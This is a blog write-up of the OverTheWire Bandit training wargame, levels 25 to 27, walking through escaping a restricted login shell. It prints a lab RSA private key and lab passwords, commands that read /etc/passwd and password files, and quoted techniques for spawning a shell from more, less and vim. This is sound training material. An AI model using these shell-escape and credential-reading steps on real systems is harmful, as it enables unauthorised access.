---
author: "Justin Perdok"
categories:
  ["Bandit", "OverTheWire", "wargames", "Write-Up", "more", "vim", "ctf"]
date: 2019-09-12T14:25:01Z
description: ""
draft: false
slug: "write-up-overthewire-bandit-level-25-level-27"
summary: "I need more, well actually less."
tags: ["Bandit", "OverTheWire", "wargames", "Write-Up", "more", "vim", "ctf"]
title: "Write-up: OverTheWire - Bandit Level 25 → Level 27"
---

### Bandit Level 25 → Level 26

**Level Goal:**
*Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.*

So apparently the shell has been changed to something else then `bash`. Lets `cat` the `/etc/passwd` file and `grep` for `bandit26`. It has apparently been set to `/usr/bin/showtext`.

```
bandit23@bandit~$ ssh bandit25@bandit.labs.overthewire.org -p 2220
bandit25@bandit~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

Lets worry about that for later and check if there is a password/keyfile for bandit26 in the home directory.

```
bandit25@bandit~$ ls -la
total 32
drwxr-xr-x  2 root     root     4096 Aug  3 19:14 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r-----  1 bandit25 bandit25   33 Aug  3 19:14 .bandit24.password
-r--------  1 bandit25 bandit25 1679 Oct 16  2018 bandit26.sshkey
bandit25@bandit~$ cat bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
bandit25@bandit~$ logout
Connection to bandit.labs.overthewire.org closed.
```

Lets setup that keyfile and connect to this `showtext` shell.

```
~/wargames/overthewire/bandit$ mkdir bandit26
~/wargames/overthewire/bandit$ vim bandit26/id_rsa
~/wargames/overthewire/bandit$ chmod 0400 bandit26/id_rsa
```

Okay, that was not helpfull. Lets reconnect with bandit25 and try to debug `showtext`.

```
~/wargames/overthewire/bandit$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26/id_rsa

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to bandit.labs.overthewire.org closed.
```

From what I can tell by running it it tries to `cat` a file named `text.txt` in the home folder of the user running the command.

```
~/wargames/overthewire/bandit$ ssh bandit25@bandit.labs.overthewire.org -p 2220

bandit25@bandit~$ /usr/bin/showtext
more: stat of /home/bandit25/text.txt failed: No such file or directory</>
```

My first instinct was to turn a `strace` on the `showtext` binary.

```
bandit25@bandit~$ strace /usr/bin/showtext
execve("/usr/bin/showtext", ["/usr/bin/showtext"], [/* 26 vars */]) = 0
brk(NULL)                               = 0x557a08cc3000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=35184, ...}) = 0
mmap(NULL, 35184, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fe1abf31000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\4\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1689360, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fe1abf2f000
mmap(NULL, 3795296, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fe1ab978000
mprotect(0x7fe1abb0d000, 2097152, PROT_NONE) = 0
mmap(0x7fe1abd0d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x195000) = 0x7fe1abd0d000
mmap(0x7fe1abd13000, 14688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fe1abd13000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7fe1abf30480) = 0
mprotect(0x7fe1abd0d000, 16384, PROT_READ) = 0
mprotect(0x557a07eb9000, 8192, PROT_READ) = 0
mprotect(0x7fe1abf3a000, 4096, PROT_READ) = 0
munmap(0x7fe1abf31000, 35184)           = 0
getpid()                                = 5008
rt_sigaction(SIGCHLD, {sa_handler=0x557a07cafef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
geteuid()                               = 11025
brk(NULL)                               = 0x557a08cc3000
brk(0x557a08ce4000)                     = 0x557a08ce4000
getppid()                               = 5006
stat("/home/bandit25", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
stat(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
open("/usr/bin/showtext", O_RDONLY)     = 3
fcntl(3, F_DUPFD, 10)                   = 10
close(3)                                = 0
fcntl(10, F_SETFD, FD_CLOEXEC)          = 0
rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGINT, {sa_handler=0x557a07cafef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
read(10, "#!/bin/sh\n\nexport TERM=linux\n\nmo"..., 8192) = 53
stat("/usr/local/bin/more", 0x7ffce0457a00) = -1 ENOENT (No such file or directory)
stat("/usr/bin/more", 0x7ffce0457a00)   = -1 ENOENT (No such file or directory)
stat("/bin/more", {st_mode=S_IFREG|0755, st_size=39736, ...}) = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fe1abf30750) = 5009
wait4(-1, more: stat of /home/bandit25/text.txt failed: No such file or directory
[{WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 0}], 0, NULL) = 5009
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=5009, si_uid=11025, si_status=0, si_utime=0, si_stime=0} ---
rt_sigreturn({mask=[]})                 = 5009
exit_group(0)                           = ?
--- exited with 0 ---
```

The following lines stood out. So its a `sh` script that calls `more` on a file in the home directory on the user.

```
....
read(10, "#!/bin/sh\n\nexport TERM=linux\n\nmo"..., 8192) = 53
stat("/usr/local/bin/more", 0x7ffc5ab62220) = -1 ENOENT (No such file or directory)
stat("/usr/bin/more", 0x7ffc5ab62220)   = -1 ENOENT (No such file or directory)
stat("/bin/more", {st_mode=S_IFREG|0755, st_size=39736, ...}) = 0
....
wait4(-1, more: stat of /home/bandit25/text.txt failed: No such file or directory
....
```

Hindsight 20/20, it might have been easier to try to `cat` the file first since.

```
bandit25@bandit~$ cat /usr/bin/showtext

#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

We now know what the shell does. It does not have any param input so we can forget about `more`'s flags.

So I have to admint, I got stuck here for a while. At this point I decided to read up on some blogs about shell escaping. I also looked over the man page of `more` once again.

[https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells)

[https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)

[https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)

[http://securebean.blogspot.com/2014/05/escaping-restricted-shell_3.html?view=sidebar](http://securebean.blogspot.com/2014/05/escaping-restricted-shell_3.html?view=sidebar)

[http://man7.org/linux/man-pages/man1/more.1.html](http://man7.org/linux/man-pages/man1/more.1.html)

### Couple of notes form these blogs & more's man page

> Linux pagers are simple utilities that allow us to see the output of a particular command or text file, that is too big to fit the screen, in a paged way. The most well known are “more” and “less”. Pagers also have escape features to execute scripts. Open a file long enough to fit in more than one screen with any of the pagers above and simply type !’sh’ inside it.

> More, Less, and Man Commands
> There is a known escape within these commands. After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:
> '! /bin/sh'
> '!/bin/sh'
> '!bash'

> Editors
> One of the most well documented techniques is to spawn a shell from within an editor such as 'vi' or 'vim'. Open any file using one of these editors and type the following and execute it from within the editor:
> :set shell=/bin/bash
> Next, type and execute:
> :shell
> Another method is to type:
> :! /bin/bash
> If either of these works, you will have an unrestricted shell from within the editor.

> Interactive commands for more are based on vi(1). Some commands may
> be preceded by a decimal number, called k in the descriptions below.
> In the following descriptions, ^X means control-X.

> v -> Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is not defined, or defaults to vi if neither VISUAL nor EDITOR is defined.

So armed with this knowledge lets look at this again. When we logon `/usr/bin/showtext` is started as our shell. `/usr/bin/showtext` is a `sh` script which calls `more` on a `text.txt` file in the home directory of the user.

We know that if `more` can't display all the output in 1 go we can spawn a shell with `!` or by pressing `v` to start `vi`/`vim` and spawn a shell from there.

So how do we trigger this state ? We can't update the file in bandit26's home folder.

Whats left...

...

...

{{< figure src="/images/2019/09/reaction.gif" caption="MFW I released I should resize my damn terminal window." >}}

```
~/wargames/overthewire/bandit$ ssh bandit25@bandit.labs.overthewire.org -p 2220

 _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
-More--(83%)
```

So lets spawn a shell. Press `v` to open `vim` and update our shell. Then spawn it.

```
:set shell=/bin/bash
:shell
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```

### Bandit Level 26 → Level 27

**Level Goal:**
*Good job getting a shell! Now hurry and grab the password for bandit27!
*

While still in our MoreVimShell lets run see whats in the home folder of bandit26. It seems there is another `bandit-do` binary like in Bandit Level 19 → Level 20. Lets use it to `cat` the password file.

```
bandit26@bandit:~$ ls -la
total 36
drwxr-xr-x  3 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rwsr-x---  1 bandit27 bandit26 7296 Oct 16  2018 bandit27-do
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .ssh
-rw-r-----  1 bandit26 bandit26  258 Oct 16  2018 text.txt
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```
